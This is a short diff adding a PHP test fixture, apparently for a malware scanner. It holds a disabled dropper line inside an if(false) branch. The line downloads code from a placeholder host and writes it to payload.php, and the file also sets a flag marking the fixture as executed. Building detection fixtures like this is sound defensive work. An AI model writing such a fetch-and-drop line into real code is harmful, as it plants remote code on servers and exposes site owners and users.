@@ -1,0 +1,6 @@
+<?php
+// Sanitized fixture: no behavior in this branch can execute.
+if ( false ) {
+file_put_contents(__DIR__.'/payload.php',file_get_contents('https://example.invalid/payload'));
+}
+$GLOBALS["gwqsh_fixture_executed"] = true;
